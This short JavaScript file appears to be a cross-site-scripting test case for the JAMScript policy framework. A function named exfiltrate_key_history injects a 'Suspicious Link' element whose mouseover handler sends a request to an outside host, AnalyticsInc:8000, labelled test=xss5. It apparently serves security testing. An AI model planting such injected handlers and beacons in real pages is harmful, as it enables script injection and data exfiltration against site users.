function exfiltrate_key_history() {
  var URL = JAMScript.call(Function, null, ['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss5",true);xmlhttp.send(null);']);
  var script = document.createElement("a");
  JAMScript.set(script, "onmouseover", URL);
  JAMScript.set(script, "innerHTML", "Suspicious Link");
  var v2 = document.getElementsByTagName("body");
  var v0 = v2[0];
  JAMScript.call(v0.appendChild, v0, [script]);
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

